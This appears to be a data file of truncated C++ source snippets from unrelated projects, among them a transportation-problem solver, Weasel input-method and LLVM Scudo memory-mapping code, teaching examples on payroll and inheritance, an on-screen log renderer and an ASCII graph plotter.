s2)\n\t\t{\n\t\t\tn++;\n\t\t\tA[N] = s2 - s1;\n\t\t}\n\t\tprint(n, m, A, B, x, c);\n\t}\n\tcout << \" \u041c\u043e\u0434\u0435\u043b\u044c \u0437\u0430\u043a\u0440\u044b\u0442\u0430\u044f.\\n\\n\";\n\n\t//int k = 0;\n\twhile (1)\n\t{\n\t\t//k++;\n\t\tcout << \"______________________\\n\";\n\t\ts1 = 0;\n\t\ts2 = 0;\n\t\tfor (i = 0; i < n; i++)\n\t\t\ts1 += A[i];\n\t\tfor (i = 0; i < m; i++)\n\t\t\ts2 += B[i];\n\t\tif ((s1 == 0) && (s2 == 0))\n\t\t\tbreak;\n\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tif ((minind(i, 1, m, c, x) == -1) && (minind(i, 0, m, c, x) == -1))\n\t\t\t\tdifa[i] = -1;\n\t\t\telse\n\t\t\t\tdifa[i] = abs(minind(i, 1, m, c, x) - minind(i, 0, m, c, x));\n\t\t}\n\t\tfor (i = 0; i < m; i++)\n\t\t{\n\t\t\tif ((minind(i, 1, n, c, x, true) == -1) && (minind(i, 0, n, c, x, true) == -1))\n\t\t\t\tdifb[i] = -1;\n\t\t\telse\n\t\t\t\tdifb[i] = abs(minind(i, 1, n, c, x, true) - minind(i, 0, n, c, x, true));\n\t\t}\n\n\t\t//print(n, m, A, B, x, c, difa, difb);\n\n\n\n\t\tver = false;\n\t\tmax = -1;\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tif ((max < difa[i]) || ((max == difa[i]) && (min > minind(i, 0, m, c, x))))\n\t\t\t{\n\t\t\t\tmax = difa[i];\n\t\t\t\timin = i;\n\t\t\t\tmin = minind(i, 0, m, c, x);\n\t\t\t}\n\t\t}\n\t\t//cout << \"max = \" << max << \" imin = \" << imin << \" min = \" << min << endl;\n\n\t\tfor (i = 0; i < m; i++)\n\t\t{\n\t\t\tif ((max < difb[i]) || ((max == difb[i]) && (min > minind(i, 0, n, c, x, true))))\n\t\t\t{\n\t\t\t\tmax = difb[i];\n\t\t\t\timin = i;\n\t\t\t\tmin = minind(i, 0, n, c, x, true);\n\t\t\t\tver = true;\n\t\t\t}\n\t\t}\n\t\t//cout << \"max = \" << max << \" imin = \" << imin << \" min = \" << min << endl;\n\n\t\tif (!ver)\n\t\t\tjmin = find(imin, min, m, c, x, ver);\n\t\telse\n\t\t{\n\t\t\tjmin = find(imin, min, n, c, x, ver);\n\t\t\ti = jmin;\n\t\t\tjmin = imin;\n\t\t\timin = i;\n\t\t}\n\t\tcout << \" i = \" << imin << \", j = \" << jmin << endl;\n\n\n\t\tf = false;\n\t\tif (A[imin] >= B[jmin])\n\t\t{\n\t\t\tx[imin][jmin] = B[jmin];\n\t\t\tA[imin] -= B[jmin];\n\t\t\tB[jmin] = 0;\n\t\t\tfor (i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tif (x[i][jmin] == -1)\n\t\t\t\t{\n\t\t\t\t\tx[i][jmin] = 0;\n\t\t\t\t\tif (!f && A[imin] == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tx[i][jmin] = -2;\n\t\t\t\t\t\tf = true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tx[imin][jmin] = A[imin];\n\t\t\tB[jmin] -= A[imin];\n\t\t\tA[imin] = 0;\n\t\t\tfor (i = 0; i < m; i++)\n\t",
    "\ufeff#include \"stdafx.h\"\r\n#include <logging.h>\r\n#include <RimeWithWeasel.h>\r\n#include <StringAlgorithm.hpp>\r\n#include <WeaselConstants.h>\r\n#include <WeaselUtility.h>\r\n#include <boost/algorithm/string.hpp>\r\n#include <vector>\r\n\r\n#include <filesystem>\r\n#include <map>\r\n#include <regex>\r\n#include <rime_api.h>\r\n\r\n#define TRANSPARENT_COLOR 0x00000000\r\n#define ARGB2ABGR(value)                                 \\\r\n  ((value & 0xff000000) | ((value & 0x000000ff) << 16) | \\\r\n   (value & 0x0000ff00) | ((value & 0x00ff0000) >> 16))\r\n#define RGBA2ABGR(value)                                   \\\r\n  (((value & 0xff) << 24) | ((value & 0xff000000) >> 24) | \\\r\n   ((value & 0x00ff0000) >> 8) | ((value & 0x0000ff00) << 8))\r\ntypedef enum { COLOR_ABGR = 0, COLOR_ARGB, COLOR_RGBA } ColorFormat;\r\n\r\n#ifdef USE_SHARP_COLOR_CODE\r\n#define HEX_REGEX std::regex(\"^(0x|#)[0-9a-f]+$\", std::regex::icase)\r\n#define TRIMHEAD_REGEX std::regex(\"0x|#\", std::regex::icase)\r\n#else\r\n#define HEX_REGEX std::regex(\"^0x[0-9a-f]+$\", std::regex::icase)\r\n#define TRIMHEAD_REGEX std::regex(\"0x\", std::regex::icase)\r\n#endif\r\nusing namespace weasel;\r\n\r\nstatic RimeApi* rime_api;\r\nWeaselSessionId _GenerateNewWeaselSessionId(SessionStatusMap sm, DWORD pid) {\r\n  if (sm.empty())\r\n    return (WeaselSessionId)(pid + 1);\r\n  return (WeaselSessionId)(sm.rbegin()->first + 1);\r\n}\r\n\r\nint expand_ibus_modifier(int m) {\r\n  return (m & 0xff) | ((m & 0xff00) << 16);\r\n}\r\n\r\nstatic void CleanOldLogs() {\r\n  char ymd[12] = {0};\r\n  time_t now = time(NULL);\r\n  strftime(ymd, sizeof(ymd), \".%Y%m%d\", localtime(&now));\r\n  std::string today(ymd);\r\n  const std::string app_name = \"rime.weasel\";\r\n  std::string dir = WeaselLogPath().string();\r\n  if (!fs::exists(fs::path(dir)))\r\n    return;\r\n  std::vector<fs::path> files;\r\n  try {\r\n    // preparing files\r\n    for (const auto& entry : fs::directory_iterator(dir)) {\r\n      const std::string& file_name(entry.path().filename().string());\r\n      if (entry.is_regular_file() && !entry.is_symlink() &&\r\n          boost::starts_with(file_name, app_name) &&\r\n          boost::ends_with(file_name, \".log\") &&\r\n          !boost::contains(file_name, today)) {\r\n        files.push_back(entry.path());\r\n      }\r\n    }\r\n  } catch (const fs::filesystem_error&) {\r\n  }\r\n  // remove files\r\n  for (const auto& file : files) {\r\n    try {\r\n      // ensure write permission\r\n      fs::permissions(file, fs::perms::owner_write);\r\n      fs::remove(file);\r\n    } catch (const fs::filesystem_error&) {\r\n    }\r\n  }\r\n}\r\n\r\nRimeWithWeaselHandler::RimeWithWeaselHandler(UI* ui)\r\n    : m_ui(ui),\r\n      m_active_session(0),\r\n      m_disabled(true),\r\n      m_current_dark_mode(false),\r\n      m_global_ascii_mode(false),\r\n      m_show_notifications_time(1200),\r\n      _UpdateUICallback(NULL) {\r\n  rime_api = rime_get_api();\r\n  assert(rime_api);\r\n  m_pid = GetCurrentProcessId();\r\n  uint16_t msbit = 0;\r\n  for (auto i = 31; i >= 0; i--) {\r\n    if (m_pid & (1 << i)) {\r\n      msbit = i;\r\n      break;\r\n    }\r\n  }\r\n  m_pid = (m_pid << (31 - msbit));\r\n  _Setup();\r\n}\r\n\r\nRimeWithWeaselHandler::~RimeWithWeaselHandler() {\r\n  m_show_notifications.clear();\r\n  m_session_status_map.clear();\r\n  m_app_options.clear();\r\n}\r\n\r\nbool add_session = false;\r\nvoid _UpdateUIStyle(RimeConfig* config, UI* ui, bool initialize);\r\nbool _UpdateUIStyleColor(RimeConfig* config,\r\n                         UIStyle& style,\r\n                         std::string color = \"\");\r\nvoid _LoadAppOptions(RimeConfig* config, AppOptionsByAppName& app_options);\r\n\r\nvoid _RefreshTrayIcon(const RimeSessionId session_id,\r\n                      const std::function<void()> _UpdateUICallback) {\r\n  // Dangerous, don't touch\r\n  static char app_name[50];\r\n  rime_api->get_property(session_id, \"client_app\", app_name,\r\n                         sizeof(app_name) - 1);\r\n  if (string_to_wstring(app_name, CP_UTF8) == std::wstring(L\"explorer.exe\"))\r\n    boost::thread th([=]() {\r\n      ::Sleep(100);\r\n      if (_UpdateUICallback)\r\n        _UpdateUICallback();\r\n    });\r\n  else if (_UpdateUICallback)\r\n    _UpdateUICallback();\r\n}\r\n\r\nvoid RimeWithWeaselHandler::_Setup() {\r\n  RIME_STRUCT(RimeTraits, weasel_traits);\r\n  std::string shared_dir =\r\n      wstring_to_string(WeaselSharedDataPath().wstring(), CP_UTF8);\r\n  std::string user_dir =\r\n      wstring_to_string(WeaselUserDataPath().wstring(), CP_UTF8);\r\n  weasel_traits.shared_data_dir = shared_dir.c_str();\r\n  weasel_traits.user_data_dir = user_dir.c_str();\r\n  weasel_traits.prebuilt_data_dir = weasel_traits.shared_data_dir;\r\n  std::string distribution_name =\r\n      wstring_to_string(get_weasel_ime_name(), CP_UTF8);\r\n  weasel_traits.distribution_name = distribution_name.c_str();\r\n  weasel_traits.distribution_code_name = WEASEL_CODE_NAME;\r\n  weasel_traits.distribution_version = WEASEL_VERSION;\r\n  weasel_traits.app_name = \"rime.weasel\";\r\n  std::string log_dir = WeaselLogPath().u8string();\r\n  weasel_traits.log_dir = log_dir.c_str();\r\n  rime_api->setup(&weasel_traits);\r\n  rime_api->set_notification_handler(&RimeWithWeaselHandler::OnNotify",
    "//===-- mem_map_fuchsia.cpp -------------------------------------*- C++ -*-===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"mem_map_fuchsia.h\"\n\n#include \"atomic_helpers.h\"\n#include \"common.h\"\n#include \"string_utils.h\"\n\n#if SCUDO_FUCHSIA\n\n#include <zircon/process.h>\n#include <zircon/status.h>\n#include <zircon/syscalls.h>\n\nnamespace scudo {\n\nstatic void NORETURN dieOnError(zx_status_t Status, const char *FnName,\n                                uptr Size) {\n  char Error[128];\n  formatString(Error, sizeof(Error),\n               \"SCUDO ERROR: %s failed with size %zuKB (%s)\", FnName,\n               Size >> 10, _zx_status_get_string(Status));\n  outputRaw(Error);\n  die();\n}\n\nstatic void setVmoName(zx_handle_t Vmo, const char *Name) {\n  size_t Len = strlen(Name);\n  DCHECK_LT(Len, ZX_MAX_NAME_LEN);\n  zx_status_t Status = _zx_object_set_property(Vmo, ZX_PROP_NAME, Name, Len);\n  CHECK_EQ(Status, ZX_OK);\n}\n\n// Returns the (cached) base address of the root VMAR.\nstatic uptr getRootVmarBase() {\n  static atomic_uptr CachedResult = {0};\n\n  uptr Result = atomic_load(&CachedResult, memory_order_acquire);\n  if (UNLIKELY(!Result)) {\n    zx_info_vmar_t VmarInfo;\n    zx_status_t Status =\n        _zx_object_get_info(_zx_vmar_root_self(), ZX_INFO_VMAR, &VmarInfo,\n                            sizeof(VmarInfo), nullptr, nullptr);\n    CHECK_EQ(Status, ZX_OK);\n    CHECK_NE(VmarInfo.base, 0);\n\n    atomic_store(&CachedResult, VmarInfo.base, memory_order_release);\n    Result = VmarInfo.base;\n  }\n\n  return Result;\n}\n\n// Lazily creates and then always returns the same zero-sized VMO.\nstatic zx_handle_t getPlaceholderVmo() {\n  static atomic_u32 StoredVmo = {ZX_HANDLE_INVALID};\n\n  zx_handle_t Vmo = atomic_load(&StoredVmo, memory_order_acquire);\n  if (UNLIKELY(Vmo == ZX_HANDLE_INVALID)) {\n    // Create a zero-sized placeholder VMO.\n    zx_status_t Status = _zx_vmo_create(0, 0, &Vmo);\n    if (UNLIKELY(Status != ZX_OK))\n      dieOnError(Status, \"zx_vmo_create\", 0);\n\n    setVmoName(Vmo, \"scudo:reserved\");\n\n    // Atomically store its handle. If some other thread wins the race, use its\n    // handle and discard ours.\n    zx_handle_t OldValue = atomic_compare_exchange_strong(\n        &StoredVmo, ZX_HANDLE_INVALID, Vmo, memory_order_acq_rel);\n    if (UNLIKELY(OldValue != ZX_HANDLE_INVALID)) {\n      Status = _zx_handle_close(Vmo);\n      CHECK_EQ(Status, ZX_OK);\n\n      Vmo = OldValue;\n    }\n  }\n\n  return Vmo;\n}\n\nMemMapFuchsia::MemMapFuchsia(uptr Base, uptr Capacity)\n    : MapAddr(Base), WindowBase(Base), WindowSize(Capacity) {\n  // Create the VMO.\n  zx_status_t Status = _zx_vmo_create(Capacity, 0, &Vmo);\n  if (UNLIKELY(Status != ZX_OK))\n    dieOnError(Status, \"zx_vmo_create\", Capacity);\n}\n\nbool MemMapFuchsia::mapImpl(UNUSED uptr Addr, uptr Size, const char *Name,\n                            uptr Flags) {\n  const bool AllowNoMem = !!(Flags & MAP_ALLOWNOMEM);\n  const bool PreCommit = !!(Flags & MAP_PRECOMMIT);\n  const bool NoAccess = !!(Flags & MAP_NOACCESS);\n\n  // Create the VMO.\n  zx_status_t Status = _zx_vmo_create(Size, 0, &Vmo);\n  if (UNLIKELY(Status != ZX_OK)) {\n    if (Status != ZX_ERR_NO_MEMORY || !AllowNoMem)\n      dieOnError(Status, \"zx_vmo_create\", Size);\n    return false;\n  }\n\n  if (Name != nullptr)\n    setVmoName(Vmo, Name);\n\n  // Map it.\n  zx_vm_option_t MapFlags = ZX_VM_ALLOW_FAULTS;\n  if (!NoAccess)\n    MapFlags |= ZX_VM_PERM_READ | ZX_VM_PERM_WRITE;\n  Status =\n      _zx_vmar_map(_zx_vmar_root_self(), MapFlags, 0, Vmo, 0, Size, &MapAddr);\n  if (UNLIKELY(Status != ZX_OK)) {\n    if (Status != ZX_ERR_NO_MEMORY || !AllowNoMem)\n      dieOnError(Status, \"zx_vmar_map\", Size);\n\n    Status = _zx_handle_close(Vmo);\n    CHECK_EQ(Status, ZX_OK);\n\n    MapAddr = 0;\n    Vmo = ZX_HANDLE_INVALID;\n    return false;\n  }\n\n  if (PreCommit) {\n    Status = _zx_vmar_op_range(_zx_vmar_root_self(), ZX_VMAR_OP_COMMIT, MapAddr,\n                               Size, nullptr, 0);\n    CHECK_EQ(Status, ZX_OK);\n  }\n\n  WindowBase = MapAddr;\n  WindowSize = Size;\n  return true;\n}\n\nvoid MemMapFuchsia::unmapImpl(uptr Addr, uptr Size) {\n  zx_status_t Status;\n\n  if (Size == WindowSize) {\n    // NOTE: Closing first and then unmapping seems slightly faster than doing\n    // the same operations in the opposite order.\n    Status = _zx_handle_close(Vmo);\n    CHECK_EQ(Status, ZX_OK);\n    Status = _zx_vmar_unmap(_zx_vmar_root_self(), Addr, Size);\n    CHECK_EQ(Status, ZX_OK);\n\n    MapAddr = WindowBase = WindowSize = 0;\n    Vmo = ZX_HANDLE_INVALID;\n  } else {\n    // Unmap the subrange.\n    Status = _zx_vmar_unmap(_zx_vmar_root_self(), Addr, Size);\n    CHECK_EQ(Status, ZX_OK);\n\n    // Decommit the pages that we just unmapped.\n    Status = _zx_vmo_op_range(Vmo, ZX_VMO_OP_DECOMMIT, Addr - MapAddr, Size,\n                              nullpt",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <iomanip>\r\nusing namespace std;\r\n\r\nenum class Level{Junior,Middle, Senior};\r\n\t\t\r\nclass Employee {\r\nprivate:\r\n    string name;\r\n    Level level;\r\n    double hourly_rate;\r\n    double hours_worked;\r\n    \r\n\r\npublic:\r\n    Employee(const string& name, Level level, double hourly_rate) : name(name), level(level), hourly_rate(hourly_rate), hours_worked(0) {}\r\n\r\n    void update_hours_worked(double hours) {\r\n        hours_worked = hours;\r\n    }\r\n\r\n    double calculate_gross_pay() const {\r\n        return hours_worked * hourly_rate;\r\n    }\r\n\r\n    double calculate_taxes() const {\r\n        return calculate_gross_pay() * 0.20;  // %20 vergi oran\u00fd varsayal\u00fdm\r\n    }\r\n\r\n    double calculate_net_pay() const {\r\n        return calculate_gross_pay() - calculate_taxes();\r\n    }\r\n\r\n    const string& get_name() const {\r\n        return name;\r\n    }\r\n\tLevel get_level() const {\r\n        return level;\r\n    }\r\n    static string level_to_string(Level level) {\r\n        switch (level) {\r\n            case Level::Junior: return \"Junior\";\r\n            case Level::Middle: return \"Middle\";\r\n            case Level::Senior: return \"Senior\";\r\n            default: return \"Unknown\";}}\r\n};\r\nclass EmployeeManager {\r\nprivate:\r\n    vector<Employee> employees;\r\npublic:\r\n    EmployeeManager() {\r\n        // 30 \u00c7al\u00fd\u00fean, rastgele k\u00fddem seviyeleri ve saatlik \u00fccretlerle\r\n        vector<string> names = {\"Ali\", \"Ay\u00fee\", \"Fatma\", \"Mehmet\", \"Zeynep\", \"Ahmet\", \"Elif\", \"\u00d6mer\",\r\n                                \"Beril\", \"Cem\", \"Deniz\", \"Ece\", \"F\u00fdrat\", \"Gizem\", \"Hakan\", \"I\u00fe\u00fdl\",\r\n                                \"Jale\", \"Kemal\", \"Lale\", \"Murat\", \"Nevin\", \"Orhan\", \"Pelin\", \"R\u00fcya\",\r\n                                \"Selin\", \"Tayfun\", \"Ufuk\", \"Veli\", \"Yasemin\", \"Zafer\"};\r\n        vector<Level> levels = {Level::Junior, Level::Middle, Level::Senior, Level::Junior, Level::Middle,\r\n                                Level::Senior, Level::Junior, Level::Middle, Level::Senior, Level::Junior,\r\n                                Level::Middle, Level::Senior, Level::Junior, Level::Middle, Level::Senior,\r\n                                Level::Junior, Level::Middle, Level::Senior, Level::Junior, Level::Middle,\r\n                                Level::Senior, Level::Junior, Level::Middle, Level::Senior, Level::Junior,\r\n                                Level::Middle, Level::Senior, Level::Junior, Level::Middle, Level::Senior};\r\n        vector<double> rates = {70.0, 150.0, 200.0, 70.0, 150.0, 200.0, 70.0, 150.0, 200.0, 70.0,\r\n                                150.0, 200.0, 70.0, 150.0, 200.0, 70.0, 150.0, 200.0, 70.0, 150.0,\r\n                                200.0, 70.0, 150.0, 200.0, 70.0, 150.0, 200.0, 70.0, 150.0, 200.0};\r\n for (size_t i = 0; i < names.size(); ++i) {\r\n            employees.emplace_back(names[i], levels[i], rates[i]);\r\n        }\r\n    }\r\n\r\n    Employee* find_employee(const string& name) {\r\n        auto it = find_if(employees.begin(), employees.end(), [&name](const Employee& emp) {\r\n            return emp.get_name() == name;\r\n        });\r\n        return it != employees.end() ? &(*it) : nullptr;\r\n    }\r\n};\r\n\r\nbool passwordCheck(string password, string enter) {\r\n    return enter == password;\r\n}\r\nint main() {\r\n\tsetlocale(LC_ALL,\"Turkish\"); //T\u00fcrk\u00e7e karakter\r\n\tstring password= \"1234\";\r\n    \tstring enter;\r\n    \tcout << \"\u00deifreyi giriniz: \";\r\n    \tcin >> enter;\r\n    \tEmployeeManager manager;\r\n        string name;\r\n\t\r\n\tif (passwordCheck(password, enter)) {\r\n        cout << \"Giri\u00fe yap\u00fdld\u00fd.\\n\";\r\n        \r\n    } else {\r\n        cout << \"Hatal\u00fd giri\u00fe.\\n\";\r\n        return 0;\r\n    }\r\n\t\r\n    while (true) {\r\n        cout << \"\u00c7al\u00fd\u00fean\u00fdn ismini giriniz (\u00e7\u00fdkmak i\u00e7in 'exit' yaz\u00fdn\u00fdz): \";\r\n        cin >> name;\r\n\r\n        if (name == \"exit\") {\r\n            cout << \"Programdan \u00e7\u00fdk\u00fdl\u00fdyor...\" << endl;\r\n            break;\r\n        }\r\n\r\n        Employee* employee = manager.find_employee(name);\r\n        if (employee) {\r\n            double hours_worked;\r\n            cout <<\"Bu hafta ka\u00e7 saat \u00e7al\u00fd\u00fet\u00fd?: \";\r\n            cin >> hours_worked;\r\n\t\t\t\tcin.ignore();  // '\\n' karakterini temizlemek i\u00e7in\r\n\r\n            employee->update_hours_worked(hours_worked);\r\n\r\n\r\n\t\tcout << employee->get_name() << \" (\" << Employee::level_to_string(employee->get_level()) << \") adl\u00fd \u00e7al\u00fd\u00fean\u00fdn br\u00fct maa\u00fe\u00fd: \"<< fixed << setprecision(2) << employee->calculate_gross_pay() << \" USD\\n\";\r\n            cout << \"Kesilen vergiler: \" << employee->calculate_taxes() << \" USD\\n\";\r\n            cout << \"Net maa\u00fe\u00fd: \" << employee->calculate_net_pay() << \" USD\\n\";\t\t\r\n\t\t\t}\r\n             else {\r\n            cout << name << \" adl\u00fd \u00e7al\u00fd\u00fean \u00feirketimizde bulunamad\u00fd.\" << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\nclass Employee { // Parent Class\npublic:\n    string Name;\n    int Age;\n    string Company;\n    Employee(string name, int age, string company){\n        Name = name;\n        Age = age;\n        Company = company;\n    }\n    void empDetails(){\n        cout << \"Name: \" << Name << endl;\n        cout << \"Age: \" << Age << endl;\n        cout << \"Company: \" << Company << endl;\n    }\n    virtual void work(){\n      cout<< Name<<\" checks emails, creates reports, attends meetings, etc\"<<endl;\n    }\n\n};\nclass SoftwareDeveloper : public Employee{// to use the Name Age etc from Emp we need to write public here\npublic:\n    string FavProLang;\n    SoftwareDeveloper(\n            string name, int age, string company, string favProLang) :\n            Employee(name, age, company){\n            FavProLang = favProLang;\n    }\n    void job(){\n        cout << Name << \" develops applications using \" << FavProLang << endl;\n    }\n    void work(){\n      cout << Name << \" fixes bugs & tests apps\" << endl;\n    }\n};\nclass Lecturer {// parent lecturer // teach()\n      public: \n      string Name;\n      int Age;\n      string Qualification;\n      Lecturer(string name, int age, string qualification){\n            Name=name;\n            Age=age;\n            Qualification=qualification;\n      }\n      void teach(){\n            cout << \"Name: \" << Name << endl;\n            cout << \"Age: \" << Age << endl;\n            cout << \"Qualification: \" << Qualification << endl;\n      }\n      void work(){\n      cout << Name << \" Provides education\" << endl;\n    }                             \n};\n// Subject\nclass subject : public Lecturer{\npublic:\n      string Subject;\n      subject(string name,int age, string qualification, string subject ):\n      Lecturer(name,age,qualification){\n            Subject=subject;\n      }\n      void teaches(){\n            cout << Name << \" teaches \"<< Subject << endl;\n    }\n};\nint main() {\n      Employee e1 = Employee(\"Sahana\", 29, \"Bizotic\");\n      e1.empDetails();\n      e1.work();\n      SoftwareDeveloper s1 = SoftwareDeveloper(\"Ramya\", 32, \"Bizotic\", \"Java\");\n      s1.empDetails();\n      s1.job();\n      s1.work();\n      Lecturer l1=Lecturer(\"Saurav\", 29 , \"Masters\");\n      l1.teach();\n      l1.work();\n      subject sub1=subject(\"lec1\",21,\"student\",\"c++\");\n      sub1.teach();\n      sub1.teaches();\n      Employee * s=&s1;\n      s1.work();\n      return 0;\n}",
    "/*****************************************************************************\r\n *                                                                           *\r\n *  Elmer, A Finite Element Software for Multiphysical Problems              *\r\n *                                                                           *\r\n *  Copyright 1st April 1995 - , CSC - IT Center for Science Ltd., Finland   *\r\n *                                                                           *\r\n *  This program is free software; you can redistribute it and/or            *\r\n *  modify it under the terms of the GNU General Public License              *\r\n *  as published by the Free Software Foundation; either version 2           *\r\n *  of the License, or (at your option) any later version.                   *\r\n *                                                                           *\r\n *  This program is distributed in the hope that it will be useful,          *\r\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of           *\r\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            *\r\n *  GNU General Public License for more details.                             *\r\n *                                                                           *\r\n *  You should have received a copy of the GNU General Public License        *\r\n *  along with this program (in file fem/GPL-2); if not, write to the        *\r\n *  Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,         *\r\n *  Boston, MA 02110-1301, USA.                                              *\r\n *                                                                           *\r\n *****************************************************************************/\r\n\r\n/*****************************************************************************\r\n *                                                                           *\r\n *  ElmerClips                                                               *\r\n *                                                                           *\r\n *****************************************************************************\r\n *                                                                           *\r\n *  Authors: Mikko Lyly                                                      *\r\n *  Email:   Juha.Ruokolainen@csc.fi                                         *\r\n *  Web:     http://www.csc.fi/elmer                                         *\r\n *  Address: CSC - IT Center for Science Ltd.                                *\r\n *           Keilaranta 14                                                   *\r\n *           02101 Espoo, Finland                                            *\r\n *                                                                           *\r\n *  Original Date: 14 Nov 2010                                               *\r\n *                                                                           *\r\n *****************************************************************************/\r\n#include \"preview.h\"\r\n#include <QtGui>\r\n\r\n\r\nint main(int argc, char *argv[]) {\r\n  QApplication app(argc, argv);\r\n\r\n  QStringList arguments = qApp->arguments();\r\n\r\n  if (arguments.contains(\"-h\") || arguments.contains(\"--help\")) {\r\n    printf(\"ElmerClips\\n\\n\");\r\n    printf(\"Generates video clips from image files\\n\\n\");\r\n    printf(\"Usage: ElmerClips [image files and/or folders]\\n\");\r\n    return 0;\r\n  }\r\n\r\n  Preview preview;\r\n  preview.resize(400, 400);\r\n  preview.show();\r\n  preview.checkCommandLine();\r\n\r\n  return app.exec();\r\n}\r\n",
    "// This is an independent project of an individual developer. Dear PVS-Studio, please check it.\n// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com\n\n#include \"logs.h\"\n#include \"..\\ImGui Render\\ImGUI_Renderer.h\"\n\nvoid Logs::draw()\n{\n\tif (logs.empty())\n\t\treturn;\n\n\twhile (logs.size() > 10)\n\t\tlogs.pop_back();\n\n\tauto last_y = 146.0f;\n\n\tfor (size_t i = 0; i < logs.size(); i++)\n\t{\n\t\tauto& log = logs.at(i); //-V831\n\t\tauto logs_size_inverted = 10 - logs.size();\n\n\t\tif (globals->realtime - log.log_time > 4.6f)\n\t\t{\n\t\t\tauto factor = log.log_time + 5.0f - globals->realtime;\n\t\t\tauto opacity = (int)(255.0f * factor);\n\n\t\t\tif (opacity < 2)\n\t\t\t{\n\t\t\t\tlogs.erase(logs.begin() + i);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tlog.color.SetAlpha(opacity);\n\t\t\tlog.y -= factor * 1.25f;\n\t\t}\n\n\t\tlast_y -= 14.0f;\n\t\trenderer_imgui.RenderText(log.message, u::dpi(ImVec2(6.0f, last_y + log.y - (float)logs_size_inverted * 14.0f)), u::dpi(11.0f), log.color, false, core::f::logs_font, false);\n\t}\n}\n\nvoid Logs::add(string log, Color color, string title, bool force) //-V813\n{\n\tif (config->misc.logs_position[LOGS_POSITION_SCREEN] || force)\n\t\tlogs.emplace_front(Log(log, globals->realtime, color));\n\n\tif (config->misc.logs_position[LOGS_POSITION_CONSOLE] || force)\n\t{\n\t\tif (!title.empty())\n\t\t\tcvar->ConsoleColorPrintf(Color::White, title.c_str());\n\n\t\tcvar->ConsoleColorPrintf(color, log.c_str());\n\t\tcvar->ConsolePrintf(crypt_str(\"\\n\"));\n\t}\n}\n\n\nstd::string Logs::join(const std::vector<std::string>& v, const std::string& delimiter)\n{\n\treturn std::accumulate(v.begin() + 1, v.end(), v[0],\n\t\t[&delimiter](std::string x, std::string y) {\n\t\t\treturn x + delimiter + y;\n\t\t}\n\t);\n}\n\nstd::string Logs::detailed_data(std::string& log, std::vector<std::string>& additional)\n{\n\tlog += \" (\";\n\tlog += join(additional);\n\tlog += ')';\n\treturn log;\n}",
    "#include <iostream>\n#include <vector>\n#include <map>\n#include <string>\n#include <cmath>\n#include <functional>\n#include <algorithm>\n#include <format>\n\nusing namespace std;\n\nnamespace graph_color {\n\tconst string axis_x = \"\\033[31m\";\t// x-axis\n\tconst string axis_y = \"\\033[31m\";\t// y-axis\n\tconst string function = \"\\033[32m\";\t// graph\n\tconst string intersect = \"\\033[35m\";// intersect (graph)\n\tconst string root = \"\\033[34m\";\t\t// x = 0\n\tconst string end = \"\\033[0m\";\t\t// end of color change\n}\n\nclass Graph {\npublic:\n\n\tGraph(int range) : range(range) {\n\t\t// initialize the graph filling every vector with empty space\n\t\tgraph = vector<vector<string>>(rows, vector<string>(cols, \" \"));\n\t}\n\n\tvoid initializeGraph() {\n\t\tint range_x = 0;\n\t\tint range_y = 0;\n\n\t\tfor (int i = 0; i < rows; i++)\n\t\t\tfor (int j = 0; j < cols; j++) {\n\t\t\t\t// set numbers on x-axis\n\t\t\t\tif (j == half_range) {\n\t\t\t\t\tgraph[i][j] = graph_color::axis_y + to_string(range_y) + graph_color::end;\n\n\t\t\t\t\t// While on the positive side of 0\n\t\t\t\t\tif (i < half_range)\n\t\t\t\t\t\trange_y--;\n\t\t\t\t\t// While on the negative side of 0\n\t\t\t\t\telse\n\t\t\t\t\t\trange_y++;\n\n\t\t\t\t\t// switch at tens\n\t\t\t\t\tif (range_y < 0) // 0 9 8 7 ...\n\t\t\t\t\t\trange_y = 9;\n\t\t\t\t\telse if (range_y > 9) // 0 1 2 3 ...\n\t\t\t\t\t\trange_y = 0;\n\n\t\t\t\t\t// move range_x once at center (replaced by y-axis)\n\t\t\t\t\tif (i == half_range)\n\t\t\t\t\t\trange_x++;\n\t\t\t\t}\n\t\t\t\t// set numbers on y-axis\n\t\t\t\telse if (i == half_range) {\n\t\t\t\t\tgraph[i][j] = graph_color::axis_x + to_string(range_x) + graph_color::end;\n\n\t\t\t\t\t// While on the negative side of 0\n\t\t\t\t\tif (j < half_range)\n\t\t\t\t\t\trange_x--;\n\t\t\t\t\t// While on the positive side of 0\n\t\t\t\t\telse\n\t\t\t\t\t\trange_x++;\n\n\t\t\t\t\t// switch at tens\n\t\t\t\t\tif (range_x < 0) // 0 9 8 7 ...\n\t\t\t\t\t\trange_x = 9;\n\t\t\t\t\telse if (range_x > 9) // 0 1 2 3 ...\n\t\t\t\t\t\trange_x = 0;\n\t\t\t\t}\n\t\t\t}\n\t}\n\n\tvoid plotGraph() {\n\t\t// iterate through and display all\n\t\tfor (int i = 0; i <= range; i++) {\n\t\t\tfor (int j = 0; j <= range; j++) {\n\t\t\t\t// separate with \" \"\n\t\t\t\tcout << graph[i][j] << \" \";\n\t\t\t}\n\t\t\t// row-break\n\t\t\tcout << endl;\n\t\t}\n\t}\n\n\tvoid calculateFunctionPoints(vector<double> coeff) {\n\t\t// store function variables\n\t\tfunction_variables.push_back(coeff);\n\t\t// reverse vector to be able to loop with i\n\t\treverse(coeff.begin(), coeff.end());\n\n\t\tvector<map<string, double>> func;\n\n\t\tfor (int x = -range / 2; x <= range / 2; x++) {\n\t\t\tmap<string, double> point;\n\t\t\tpoint[\"x\"] = x;\n\t\t\tfor (int i = coeff.size() - 